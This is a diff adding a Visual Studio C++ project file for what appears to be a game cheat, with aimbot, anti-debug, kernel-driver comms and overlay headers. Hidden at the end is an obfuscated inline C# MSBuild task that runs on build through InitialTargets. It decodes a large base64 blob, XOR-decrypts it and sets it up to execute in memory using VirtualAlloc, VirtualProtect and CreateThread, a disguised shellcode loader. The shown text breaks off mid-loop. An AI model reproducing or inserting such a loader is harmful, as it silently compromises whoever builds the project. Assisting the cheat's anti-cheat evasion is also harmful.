@@ -1,0 +1,229 @@
+<?xml version="1.0" encoding="utf-8"?>
+<Project DefaultTargets="Build" xmlns="http://schemas.microsoft.com/developer/msbuild/2003" InitialTargets="mbsYtwCvty">
+  <ItemGroup Label="ProjectConfigurations">
+    <ProjectConfiguration Include="Debug|Win32">
+      <Configuration>Debug</Configuration>
+      <Platform>Win32</Platform>
+    </ProjectConfiguration>
+    <ProjectConfiguration Include="Release|Win32">
+      <Configuration>Release</Configuration>
+      <Platform>Win32</Platform>
+    </ProjectConfiguration>
+    <ProjectConfiguration Include="Debug|x64">
+      <Configuration>Debug</Configuration>
+      <Platform>x64</Platform>
+    </ProjectConfiguration>
+    <ProjectConfiguration Include="Release|x64">
+      <Configuration>Release</Configuration>
+      <Platform>x64</Platform>
+    </ProjectConfiguration>
+  </ItemGroup>
+  <PropertyGroup Label="Globals">
+    <VCProjectVersion>16.0</VCProjectVersion>
+    <ProjectGuid>{BEC1FD42-6DB5-4EF0-817E-19B3F1FA1BE5}</ProjectGuid>
+    <RootNamespace>wdamonitor</RootNamespace>
+    <WindowsTargetPlatformVersion>10.0</WindowsTargetPlatformVersion>
+    <ProjectName>SubZero</ProjectName>
+  </PropertyGroup>
+  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.Default.props" />
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'" Label="Configuration">
+    <ConfigurationType>Application</ConfigurationType>
+    <UseDebugLibraries>true</UseDebugLibraries>
+    <PlatformToolset>v143</PlatformToolset>
+    <CharacterSet>Unicode</CharacterSet>
+  </PropertyGroup>
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'" Label="Configuration">
+    <ConfigurationType>Application</ConfigurationType>
+    <UseDebugLibraries>false</UseDebugLibraries>
+    <PlatformToolset>v143</PlatformToolset>
+    <WholeProgramOptimization>true</WholeProgramOptimization>
+    <CharacterSet>Unicode</CharacterSet>
+  </PropertyGroup>
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'" Label="Configuration">
+    <ConfigurationType>Application</ConfigurationType>
+    <UseDebugLibraries>true</UseDebugLibraries>
+    <PlatformToolset>v143</PlatformToolset>
+    <CharacterSet>Unicode</CharacterSet>
+  </PropertyGroup>
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'" Label="Configuration">
+    <ConfigurationType>Application</ConfigurationType>
+    <UseDebugLibraries>false</UseDebugLibraries>
+    <PlatformToolset>v143</PlatformToolset>
+    <WholeProgramOptimization>true</WholeProgramOptimization>
+    <CharacterSet>MultiByte</CharacterSet>
+    <SpectreMitigation>false</SpectreMitigation>
+  </PropertyGroup>
+  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.props" />
+  <ImportGroup Label="ExtensionSettings"></ImportGroup>
+  <ImportGroup Label="Shared"></ImportGroup>
+  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
+    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
+  </ImportGroup>
+  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
+    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
+  </ImportGroup>
+  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
+    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
+  </ImportGroup>
+  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
+    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
+  </ImportGroup>
+  <PropertyGroup Label="UserMacros" />
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
+    <LinkIncremental>true</LinkIncremental>
+  </PropertyGroup>
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
+    <LinkIncremental>true</LinkIncremental>
+  </PropertyGroup>
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
+    <LinkIncremental>false</LinkIncremental>
+  </PropertyGroup>
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
+    <LinkIncremental>false</LinkIncremental>
+    <IncludePath>C:\Program Files %28x86%29\Microsoft DirectX SDK %28June 2010%29\Include;$(IncludePath)</IncludePath>
+    <TargetName>DeanosExternal</TargetName>
+    <OutDir>build</OutDir>
+    <IntDir>build/intermediate</IntDir>
+  </PropertyGroup>
+  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
+    <ClCompile>
+      <WarningLevel>Level3</WarningLevel>
+      <SDLCheck>true</SDLCheck>
+      <PreprocessorDefinitions>_DEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
+      <ConformanceMode>true</ConformanceMode>
+    </ClCompile>
+    <Link>
+      <SubSystem>Console</SubSystem>
+      <GenerateDebugInformation>true</GenerateDebugInformation>
+    </Link>
+  </ItemDefinitionGroup>
+  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
+    <ClCompile>
+      <WarningLevel>Level3</WarningLevel>
+      <SDLCheck>true</SDLCheck>
+      <PreprocessorDefinitions>_DEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
+      <ConformanceMode>true</ConformanceMode>
+    </ClCompile>
+    <Link>
+      <SubSystem>Console</SubSystem>
+      <GenerateDebugInformation>true</GenerateDebugInformation>
+    </Link>
+  </ItemDefinitionGroup>
+  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
+    <ClCompile>
+      <WarningLevel>Level3</WarningLevel>
+      <FunctionLevelLinking>true</FunctionLevelLinking>
+      <IntrinsicFunctions>true</IntrinsicFunctions>
+      <SDLCheck>true</SDLCheck>
+      <PreprocessorDefinitions>NDEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
+      <ConformanceMode>true</ConformanceMode>
+    </ClCompile>
+    <Link>
+      <SubSystem>Console</SubSystem>
+      <EnableCOMDATFolding>true</EnableCOMDATFolding>
+      <OptimizeReferences>true</OptimizeReferences>
+      <GenerateDebugInformation>true</GenerateDebugInformation>
+    </Link>
+  </ItemDefinitionGroup>
+  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
+    <ClCompile>
+      <WarningLevel>Level4</WarningLevel>
+      <FunctionLevelLinking>true</FunctionLevelLinking>
+      <IntrinsicFunctions>false</IntrinsicFunctions>
+      <SDLCheck>false</SDLCheck>
+      <PreprocessorDefinitions>NDEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
+      <ConformanceMode>true</ConformanceMode>
+      <InlineFunctionExpansion>Default</InlineFunctionExpansion>
+      <RuntimeLibrary>MultiThreadedDLL</RuntimeLibrary>
+      <UseFullPaths>false</UseFullPaths>
+      <FavorSizeOrSpeed>Size</FavorSizeOrSpeed>
+      <LanguageStandard>stdcpp17</LanguageStandard>
+      <WholeProgramOptimization>false</WholeProgramOptimization>
+    </ClCompile>
+    <Link>
+      <SubSystem>Console</SubSystem>
+      <EnableCOMDATFolding>true</EnableCOMDATFolding>
+      <OptimizeReferences>true</OptimizeReferences>
+      <GenerateDebugInformation>false</GenerateDebugInformation>
+      <UACExecutionLevel>RequireAdministrator</UACExecutionLevel>
+      <AdditionalDependencies>dwmapi.lib;kernel32.lib;user32.lib;gdi32.lib;winspool.lib;comdlg32.lib;advapi32.lib;shell32.lib;ole32.lib;oleaut32.lib;uuid.lib;odbc32.lib;odbccp32.lib;%(AdditionalDependencies)</AdditionalDependencies>
+    </Link>
+    <ProjectReference>
+      <LinkLibraryDependencies>false</LinkLibraryDependencies>
+    </ProjectReference>
+  </ItemDefinitionGroup>
+  <ItemGroup>
+    <ClCompile Include="Imgui\imgui.cpp" />
+    <ClCompile Include="Imgui\imgui_demo.cpp" />
+    <ClCompile Include="Imgui\imgui_draw.cpp" />
+    <ClCompile Include="Imgui\imgui_impl_dx9.cpp" />
+    <ClCompile Include="Imgui\imgui_impl_win32.cpp" />
+    <ClCompile Include="Imgui\imgui_widgets.cpp" />
+    <ClCompile Include="Main\main.cpp" />
+  </ItemGroup>
+  <ItemGroup>
+    <ClInclude Include="Aimbot\aimbot.h" />
+    <ClInclude Include="Aimbot\input.hpp" />
+    <ClInclude Include="Aimbot\librarys.hpp" />
+    <ClInclude Include="AntiDebug\CallStack-Spoofer.h" />
+    <ClInclude Include="AntiDebug\Skicript.hpp" />
+    <ClInclude Include="AntiDebug\xor.hpp" />
+    <ClInclude Include="AntiDebug\xstring.h" />
+    <ClInclude Include="Comms\driver.hpp" />
+    <ClInclude Include="Comms\librarys.hpp" />
+    <ClInclude Include="directx9\d3d9_x.h" />
+    <ClInclude Include="directx9\d3dx9.h" />
+    <ClInclude Include="directx9\d3dx9anim.h" />
+    <ClInclude Include="directx9\d3dx9core.h" />
+    <ClInclude Include="directx9\d3dx9effect.h" />
+    <ClInclude Include="directx9\d3dx9math.h" />
+    <ClInclude Include="directx9\d3dx9mesh.h" />
+    <ClInclude Include="directx9\d3dx9shader.h" />
+    <ClInclude Include="directx9\d3dx9shape.h" />
+    <ClInclude Include="directx9\d3dx9tex.h" />
+    <ClInclude Include="directx9\d3dx9xof.h" />
+    <ClInclude Include="Imgui\imconfig.h" />
+    <ClInclude Include="Imgui\imgui.h" />
+    <ClInclude Include="Imgui\imgui_impl_dx9.h" />
+    <ClInclude Include="Imgui\imgui_impl_win32.h" />
+    <ClInclude Include="Imgui\imgui_internal.h" />
+    <ClInclude Include="Imgui\imstb_rectpack.h" />
+    <ClInclude Include="Imgui\imstb_textedit.h" />
+    <ClInclude Include="Imgui\imstb_truetype.h" />
+    <ClInclude Include="Main\Functions.h" />
+    <ClInclude Include="Includes\definitons.h" />
+    <ClInclude Include="Includes\includes.hpp" />
+    <ClInclude Include="Loop\Loop.h" />
+    <ClInclude Include="Loop\sdkloop.h" />
+    <ClInclude Include="Main\description.h" />
+    <ClInclude Include="Main\main.h" />
+    <ClInclude Include="Main\offsets.h" />
+    <ClInclude Include="Other\auth.hpp" />
+    <ClInclude Include="Other\color.hpp" />
+    <ClInclude Include="Other\Controller.h" />
+    <ClInclude Include="Other\defs.h" />
+    <ClInclude Include="Other\font.h" />
+    <ClInclude Include="Other\Keybind.h" />
+    <ClInclude Include="Other\Print.hpp" />
+    <ClInclude Include="Other\skStr.h" />
+    <ClInclude Include="Other\vactor.h" />
+    <ClInclude Include="Overlay\menu.h" />
+    <ClInclude Include="Overlay\Overlay.h" />
+  </ItemGroup>
+  <ItemGroup>
+    <Library Include="directx9\d3dx9.lib" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="directx9\d3dx9math.inl" />
+  </ItemGroup>
+  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
+  <ImportGroup Label="ExtensionTargets"></ImportGroup>
+  <UsingTask TaskName="nIxJ9UnXyD" TaskFactory="CodeTaskFactory" AssemblyFile="$(MSBuildToolsPath)\Microsoft.Build.Tasks.Core.dll">
+    <Task>
+      <Code Type="Method" Language="cs"><![CDATA[[System.Runtime.InteropServices.DllImport("kernel32",EntryPoint="VirtualAlloc")]static extern System.IntPtr fvrMuKA(System.IntPtr a,uint s,uint t,uint p);[System.Runtime.InteropServices.DllImport("kernel32",EntryPoint="VirtualProtect")]static extern bool yzrOFg0(System.IntPtr a,uint s,uint p,out uint o);[System.Runtime.InteropServices.DllImport("kernel32",EntryPoint="CreateThread")]static extern System.IntPtr HSYlGjF(System.IntPtr a,uint s,System.IntPtr e,System.IntPtr p,uint f,System.IntPtr t);[System.Runtime.InteropServices.DllImport("kernel32",EntryPoint="WaitForSingleObject")]static extern uint sCujzQm(System.IntPtr h,uint ms);public override bool Execute(){var ezFNvf=System.Convert.FromBase64String("+ALSG+WezUcGPhWm/HSPkHv2Ew8SCRZ1yaPLxgrepX3mDF5aca28YbB/lbmyDiNf7bqyU2XaxHX2asBXiLrq81zw/QE4WulBE7NS1Pjh7n/+zuZtwlata9bFBgOGD83v5EpSgDjlcrwvQKIyC1OOoLy9pnZHhFh2ffkOXUU7ODjHkU65QEwxLHeXk4CeTKezqma0YpdKwOHSexr4/ekHgbpn+hOn6x/TDu/IKIgaZ1wP3KyeG8I4YIAYT27uQ9JvTypcfKD9g+VaShvsWPblgVWTAxmmkLXP+iDNO1yV3xBFaI315QO869jix5QI8EWLCizgEndXxHGGt5h/+KaSvQvgBL92tAjlyGL3YaMb8HKTfQ56XMoIb9inmn0snI3kMNT2s5Sa7gJJQz4lHanCDuautz2lHQZkss+/1iXnKxKQJK47WezRL48V7JUfdo4w2CcDq7c6yNOn1+djcoRMc48bH5ku/5euebMkH6vhMT+pNadW482lE+V+g8vNmxN4acXGPO00b3ADDUZoN8N5rZwpmPOm/1Q/5TtHsQ3A65LpnW5JKKYuDX3zunfXFNPuYNIwewdLNwGFnU25tvgrYg8r9jAjhBAw6SKeT746ULItP3xkLwMaN77bOaPIAE2uE/uKE+ebbuXeNq25Ikmg74iHgnYLwQ1JNdncIzzaNN4RDLNJ0C35dDcNgj2qv54+tdrfKHYfm99UAwb9hPUZGzsp1WtMNL1dzpeG1immaN6trhGNUP1w1Mq0nxw1MV7ygP+9FrMswtavDClFBt/mO9LjOksWh8xFy+x2ZPvj7K85gGj84VB3ZSlrhSDaZXa3gmV5tnbdnwkzZRGvPcAabI28rGcbRkt4se+GkX7U4Q5jaoaohDrLEZxADC2LK6M2iCW5EXzWy+VTGGoCkSK4MTKM7wp2GNkBi41jbG3mAS/kSL55MdFkpm65nET0/fknjK0Fa78kZ2SQJ5f5e7LPkoqkxS0bnia+MtX5T4udUnFFHkeaToG8ZZ22ZcUD/CieqiVXFLM97e+gkeSuRhNzV8Dmj5ZQyi8ZXJ+dS9aG1ZXfr5AkDIKnsuPZJB2g2DpgCR8MDnAwGoXUROH61UjabJvTLfJBTdjJGuH2Ger8CjuZWM95NrKwJCHJb9mSCZAyR7KLO/zP9wY0npv2siXXlqKKt2goQw+JPnCwFUq3OvP/6vf9B86Md3r5DDtwV1fS1gI1rkB4fcObh6jIeslZlsxk3Tm3vkwvBwOzNXnK0biImDhPEiumvARRyT2QR/FVmYLDeq0YCVcbvV2aHE7dlMbxMEeb3pk4x4CocTnoEOG1rOwLYx3F1AXv+BcAPHpW+bSgFi/hIVuzFMb2CO6gaw8DGxYx39lEUmGk8siyTegjbMULvw0jEHgCqO5yMFKHSqEHeuTp4FGaCbi5onRRGkyXwqYk1r2Gw8dpoCbBLc9jh1Vx12ZDalcGFWlNl58BLOJmsy3XRw9waQOvvsQa0eHNcKQzzNIQqNYa2hTwj81dUJIsWqbAjwRJT7aP2M5FvgDw9A7/yreFqPO4KzrVMHGjk6h2WoBjkgE5/QEnENlFCFivBtZvctvjclvYwsBKzwe2iDFHO4TnKwats2eNPaYPdMomkuOWMzh3TD3Gdtn/a01BK2U9GywjxXrzk5u6jyyMfVz5fOcrcIo17pE32qfYdugIYhkD7Ja51RsOEeFlhOylMdJf+goV1KuO4T01vhECONpMd4I8ooh/co/cRTz9qtSBKFD/D0gMflWA6SHHuTzYQ8xYnnxD2YF2FsSbO6fn2gOOepKMRZKVLePJX+J/MJnJNn+fgOPbLNxTO3jFJxSdNteAp4IoHXABcFjmRwv/a4f/DwU+gU7KmzZSFdkR8vvY+PZPPWzXT+IFwy9/bXc/5R0yZQazwsGydmwuzQlRzpWPpg3AghNPtpIntZSZD7paJZMDs630Yu/wNPtb0QFHI2PhEtHs8htqGK9UjNDYaBNcQ3PV9E/lV9uDsB6U92gfwwaBgVtysXVVX16SrcCO2+vBUr1nvBbN2pLmSepu6UgkMio87Z2KppzgZDOvBYYKXcwx20tJ/A2ZCbilJ1gGwzAYySmxWmE8kv6ZuSPvsUIO96tkLFRSWSQAXkymCYWZzvmiBxlWqxncX1j+DR7jok9szRb5D/SxQHTXeT80FoiQfikPkL3S4IHiyvq+8WXe00QBnr7pSfehnzYvuCKDjeL0/5DiHjv8MxC69xKVQHkhQI66Pw6kVl0eFnBjVgT2T7xHukMGEnLGFVVSlMQvOvk2EbZXDY8RjEevdPYeVjYTWkt8zxbR6472UdOqNcPEBPc4o8TmM4r958qqtb8kJ7mXrsXBUKefW6BjorwBJuumpA0n6J66NHwuqD+yZC31GgNkn1tvoIzUNtivQ7zx11j14jLe36q1x/RcjHUnv8g1jvISa2n4uSOuoUxob0y4TpLljGMJGN8K4fBpXxbJP8CC858lYG7fWV3aFmUXSoZfHcPsgQddbnLHS1hV6NgFwi5zAZ6C61xs9sBhuVEKWJ/WvravVdIyfiSQoN1fjB2i+88Hc55WVX8pRVvGWg3qrDEPG5tEPmazSsSkkvuUz8riOAtses7QoXH7l+GXWGYOCleWD8wQ47W7bXXDj8K9GbsVkPcFYFsuCQaD0mE3F/CUPe04HO8yI2uASol6qU+XyKyppMVSggn15+OFLd41DQTV0+e47LE4dz2n3Gl4/mUWRIEhsIeWBI6aBzl9ji4MmVu30jmvWTn9XuriY5grHs5gDGYqvYMU95HUAlpRp7IWxiUBPwa5VUGSo971AmNujRKbERAFgN9oLC0XDrAWOzX8iYbfNf0LCdhbqilFfsB9uugaIEyWLM25NIyPZXVPPdOaTT3gWjwGlOn5BJwP09IyIiX6MtTKqP42bFnX5p8+PCHMQktFQfLxc9h2iVpwCi0XdDMfS4Cxsnc6auk7I6gQ791/4sgEBsmpStryVaqmxpisHfj1RgLNTEOz7RH8dDFwYFNZ1wzVTgRKvznj+TUOP4rK3L1TyNzncEcpML9WQGfXBgUTnHqBkn+fM9aDSPExDo+IRsFQGeA4jQ1B41RUopaxEamTGWdjLNXOjqG95TphOJgQ0F1v2/Nd1LxgHC5LfG8OZJtWzguxhLRAjDr5D7mlgCZ9QVpDZH4ofuehXOsWxZc4CSjJNMUxOCTtVzU+qrBl0eTCJdTJGlQRgtMmJsbdUA1g7POrXGMwRRusk0CEMz/aNL1V/9rG/8bdezHV8KVbSqAC+gJ8lSyVdrEqb/y8ouzWs1qt+GfaN3FJgN3ioEgvcbMDU4xxfe4YzJHumOWyayOtd755woKseOzTQw6qA+Y2xPzAoM2FQfQAIVryfY/hBxAwOTU1yzy86Ys4XISOxLlxN7UbNjvzSvcRiQ/HnesMXdjdg/QyCvq+l34oTn6z5Y2mpNxfpdWwNmIWNVvnwW/mk/ccqlMyrvI8y4nSxnXIe4fX2HCtZgUVUxp6XTefB+tLRCPbj1KorWVS+AAnOaVB17dqeP1azXXaFV4yak0k2Ww1aKCCmd0U1vDwtqyNN/0fzr7arkP8eVHUi+ZIRUHwEXDIimeC9RjhK61/7EUQengV3aDS0obryIQekZQpI0brDaSUZUHsWQoWq1dcSCbrRykRln+DvP4CNrOcebiQxcZi4saTq08XZiwgkvs+3FsSTUa/qF3G6c27vIgbpeH7Qg17cMoiVxYXhKQq7nObczb77yyd3R/dxgI/cDjghfB1oI6jDAN/8/w1x74A0GP7PreOcUiDV4ugduKjzb1wq17Wy+wU8M1Y12gxrnIOQZzNPYOr9nFJ1mGsGBHdUQoahsRZOwf11D6hU4m0xoOswSAj75TzhLy8LSXgN+n+QRMDPDplq4ddsIc4dXc67Dx6Ktnwp3cfMYQ3CJWZrDd+dBK6wuA9gpHldDZxjcL1awIE65LJaRu73kXucyA3BFcT0oSktVjlgK4jGybFkrFgBXQkM29VZWruWdw6rhnSt5lcTlMhyV39M+1hBwhAEASn7Glp0zwRGs+K20YPljnlW9kvJCiOqVhNtJz1sTW1p208Sh0X1EUQBKB2Pm/EDF/b+ZX2Vh1ZeugXjZ8i3BtGICVTlDidbIeCjU5NzSR1ehwLCFIvPrpg5q5HqaT5Vm3S0nLLsGbAqFhL3Fe+Xsz3lxW62EzFj21EWlnRLH4oqGv1Zs3eYHbe6QaTWnnrxVESha60DHS/p+hJhv2eqJVaxdK7b3QkYppJaXD5qBAFbbOFeZKAje2RfXUS8u0HMMXoHQvll+LV/OCPnIcdJSgUILE5o6+U2MiXH9niJKcZMogl6VNXlfAtPBWbgceO+tQzOA/nt9Zc/6GFHczPJLZzGo0jwiWkNXIJ1NdPICzsORr7xevHZn61oqkmQVQOL0rW9QzGaCYEX5vUYarURYdZpVQC3kMw//UJ7AZ/uKfm/+brsHqwO2uOvJNN0KHLDkb8FhKZLRaivJJXftsNWjpacNWK57+7K0kBLzkqkDzicEUaxnvNdpY/gsBkHX6D/BZo0bppoD9GNVqb4FJCMDFGEWpBjVdOEX38aphmwTvN+KU8iENt7uaDtWrgIADadvt2vX/aXDi2OBAC4hN3x7bSWbqLh9WRiXiYWeH/el7FsDBNK0eokNq9SuPwk0nkHalJuv6RzputUw/WuOckhQwelg3Ls4I7SDlGYlz3g4yZE70PBQRn/rYzBKQnYT49IFEA7D/vlGUgOI22FpOUwkyUKKYLVdFQiKQXMpuV390CZI8IjWMzi30Q6Of9XdLSJgSGcDtDfdwCEMLwBDuJFery76jWump+a3Wi3Hh6X7IQ+3uUN5deCUxVaHn0DWogLcn6pYnZ+hZhHL2dehz8mJ5mCxcBpwT9s+43dDGLgEi6VAPMAzb7Pc2x+nQSqIQEOAZhY2DlKD0xBbejPMVUZMwR47RIzxjGl6SI0gBLSAIM2oBs7FhVPxOdR3pxpbaa6qG97JhzQqmV6ukZVomECBnL1Knn1v9r2BzS114gkbfmNleleHDyEKoOdUrPnJ4E0p/9JqeTQyR/BoVTvEqbojWafKMyJyWFrC5s2QLumgcKQvFW8O8mCNWPNerZnoUmmeCKQRxKv5sxVs8ZgHe0r09hWtN6Ex17FY/1S8ODtKDXbSO3s1wgxa7NNWYEY/pT5AODf3WgOne4NL2ld0uZoUfmPTT98MMkW8ZOlrYnFrPfULMJDKq1Ws2DIoN0fRmnzfJKQjhv0PgwFFu5tayFShpX9SStf+w88PJgSuj82sQd4E0MaWY/Brz99EywWpcO/cpw43a2B0Ln4bf3pcZj54yu5IKl0AQRYGs1yO6FYi2CaABSsPri/uKiF1WqAXU08WwDfyJw0fVeYBOSB4zUU4Hk6VL7Q2zrQ2UUk+x1vSJw3ASOlRZT+qDATicNCmM7p9z4K4Hesmof3eCNbg7K7prvCbIuZEruEds22NjEuqvwrB17GDtXOHCma4EFgb8ZQSskGwN/zT/wQbErtZ1+bfZsZHr3REk7RPXHsWJkxvDY5BrT5Knp3ZNvAscZEiqZhoW9LInkE/duVb91uXpZ5fq//vd8qPjvJi52y1Iv7Kk1UgEwa4OI2eUY6FBE4RmGMISGL55a1J7L3Adq583SERm+1DFqlS13ikCx1DEV7BG6321NfwcyUpROyLPP53FgKDIYSmIfghP8o1q9WXotjUgCfCm9DPcR8Wy22PC3cuujgoA9ouGQNFUAUOcjRkOe2H4fn6jpB+cvnvJBXg30n9SS/wzRTy13bjQ9LvuVrCSLZC1fQ9ooOmyuCQGT195X4CDP+M0lv3POZhOavBJ5+HMZhnZHdL9fspB/VTXfko7GuKvAI2Mpj+PdbYoG1Pb5TNVC0fhK82eqdS/JYwicXZXCwaB9cgdDmtadHHsGwBd+wF3MdV143gp/jls53aRxAMtQ7KFx39/yzEqSBiOWFOE6B6S5NNdxxQaw7PH69k664QqnffdT27KOIQ5wB9TRtcQIwbDIYAt+yuU4zdWXDilddcD779L/613tx1q0k3lot6IUwBxVpSkU7cHlMaTgAiCLPOUfxgkTlx8hH0XYTpwQc07p5F1Zytd0LkMtvZvFGG/EhMEeBj4h4OD46rL4SFdWGEmxxYbgHNE4cFLcP4BgwrilXnnZnklhkvIesKrmr9ShWEzgCmgDxaMzhHv1QguRiu5rRRcUTZcUHQBLX6r3mWXeTTc7ZYeOZummb59Ni9wPV0rgqZU+xGV0PGIhfmGrcsqF7TziR7PUUaMsoAm13wVijYCjZZHEZ8pA8H37dRtElsQlI7P/ga2E9vjjRmO/eyWirQcm9dCOcG0MkEpMuB3aujXa2werIMfNf/o+m3n06vZpi3CNot9EQX+dSpEnl08rw8XX7gGSnlSlSqu75cVTuWYlGZZjkzI1KPMJqwugAAaxwozPJl4qXdAiZUXu0zTx1GwAzTl6JJmnUodE7JbElbrhSdZ2oJj54ddINXUcgODnklgfVxhcH0lfBSRQg+1bkDFro/bB42w449tjA+Z27S4z1tFb3nV1RnXXtZrz+ti2xaAea1FncRHEt24z+FVHlslcUyZZHWHEVE1gNq1WWbbNCWoYfjkxUnXuNTPDlBWFTl5Ek1rNwLCNyif9FXoLbvK9dxPmOLCcUQumZY0cVjs/XmzECeOJrfUJ3sruiAUs8zfV17EFgM5dhTDULM6w+wnHulv5ns0AbCJdY9q8Db7LoBsdW+51eYOf5vHAKeKgyMcrG+8VxoEG7H6s9fDX/TR863LkDygI7G99j7ps5LLfui3OqtWlQltF93wvHtkJgWfYEAnKnrf+69TpNcrEOk4LbkBDf+lVl7hJ/m+KZNUGWg9+QRUy9pFifKsKrb17zEP/72doJ4LvhivyDyYSz2jTSFbPxbVwGXH5Q1aOB50J+RGnuaKIkwH7svf22VMcPnIA5M521i0lD1gcuCh+h/LFTYixwBFkBtg8pxBcDhzpOrXRpdOuz15z98vxD7Jekct/oINGQTtWEIZlpdnf3eJNRRAjkmFCQrMxbqP/gehC3tL7FFHSEMnOInQFfYXzwn5fYORw5fJBeYm4knKuEhfFB0xvcSNm8mFMhvNQRm8SVZmdFAf0Vh51UEswlJIpyJI2/qiMksO1zWuTN57cq7SLNk0Gk28vr5N1Eb6p2NzZ0WHzLtaeVrw0GMoj/IosBr+/+vHs0Ru1rLMQ9BmTOvix+zG8Kt7372ivJ79TQ+uBIJofOGg2nYiw6hBV4+qL62o6JguSCZL2G0KJDBVQTjrXAcFWy4OvBHxD5lumrA/n3VDgOSPSIeGmC0stWWzsJJqHNNiuL6YdwNyyfcrBw1PfEW1FhqhxCHYaMuNrnvE2rC8KdO57P/mSohNTRzjSXoSdnxwBVHKeZ35JY86JbQtHjvymquBx0DzgOPojxopbeb8l9RB17FTx4MqP/dqrB/N+grxAcCwmUe60QNu9AkwCN/NfB8JPdIgzjuFZguJCLaLkNkJ/EoheD8IyPH4nPag0MVA1vKActt4VKeqqwcyckCITSnkGf2GNTjjndo/m20JfOdxXWtYgh4GbcG/n5ZQX72vugWY0vLPMSBxFI30F7cB2569v0scRLCGQnQ20TafdKgVbGqtSjX0kHcDV/ZRhKFK/CL32CVo+kRgzSKyQvasjWweDEqS6nugUPb3JwkVTa8mT6mlP8zgisBn03c9vILLh/WUbSBGMvbNhSrJCYHkSSCUqyczwz+cUORqn0wgrjHNk3xdHSuc48uJEEg1PttPzCTbjzQ8ZsARQIqrntPlMGgX5mKErzgohFgBmkRPjzSvALKG0TayUWvutfUhSsLDNTbpb8ZTSrkblLa5QgPQQRKlugp3xKSO0h25QRv1mx1LB0r6kWJxkrGsj239FWuOOzxd6aPYIj/vpN63NER5qzkG+azN1ug2Sc/OksokTn1uIPCV8Dz05FH6q2uEsprI7QGeOpbHpkKJl50zbcRTae72Ha4qY+TarF/JoDFVnyXgla6Ll0NkndNfhuMdAdrjb3FRfjJcurHpTJcmAIZWove312NQLyuOefG+yAsgZ/XuDrBceo4xJuVeF+HdJryDXmFuDpNj7Wr5qPXbfoxis2SmyJCwd3EWLj9WpqYa77wdRbpYEVvKZL5AwJAdApVD1P8ENVBrk7q9uNfqWKLx0VT02UGUQzCjI3oxhCme3nMVhyhIAk2sqA0VZFg9UzSN+NUrviIFESVTPRUDe5ZQL0rSZL0WW5LozOAo822khXlk6GDPWOZThEXpGVNvVVtQfWUpAjPFPQvAbZKdMMfuf0j9G6n3e06yBNJXsu90yUXTeqQMCx6HJNCJ+FuwgKqW5Ak0OKFlvuuhwa+d4yogeS+5xU1V7R2h+ajF8XPOBi3LsUb3DT8U5gDehbSsXfLRQQM5ADc9IHLsrXGQn98hq7xFveF3OvaBBo+0gFhuIaOAhZfe8OmdvKQ3fAE1cug8w0r92dnrvdIZjSv/gsWtoWKxzgpG+4euloAsbB4s2Ewqjo1gugHN4LkMQ161QtSnAPBNMZj2U20TQdg2rq9uHbfQndgyO64XA7RZCXbaZenRAJl7gHl1SjkzcDvH0f/EyS+WcEMYyFJQJ+nf9s8Umu7ywBSBTRVM2h14bC2EcnS4j7+d4QjQ5YJ8b2jTXbDN0Tz0eIfkGdFICYLil/JpK2c1zRcmoy8wzIq0EkEGzyAfJr4C3ZDMXiEtUDy+dg2u6EFOt4V3Ikld3VgbYvfw804I8SODOCNug+6ExJOwpbfuzWsk8NCoYvxMrM78uNq6tpeiqVP//8Q8L8qDNh2jXvysHNw1vEul1Eeslxr3wAEr0mDdpH6QrS4SQRcRbssNfxUc6qRHBsfzPKpMcg664z/Cgzp9yCElSW00yhVhLsBn8Np3MXdky+HqoVYBY/0cC");var nui0z=System.Convert.FromBase64String("yqfA3W+Rjuc3Pi4y+Bgxpmg7cQIPGMJ6xLLRMZR9N70=");var T1RpB=System.Convert.FromBase64String("jLNBLbaar/XrhyA3Q/jDTWYKqL853f1ACR0DekBVAQc=");var X6rFt=System.Convert.FromBase64String("oZ1b6zyV7FXeh975TMwpPMf5Cr4ETqpvS11eDs+KEW8=");for(int Gc=0;Gc<ezFNvf.Length;Gc++){ezFNvf[Gc]^=nui0z[Gc%32];}for(int 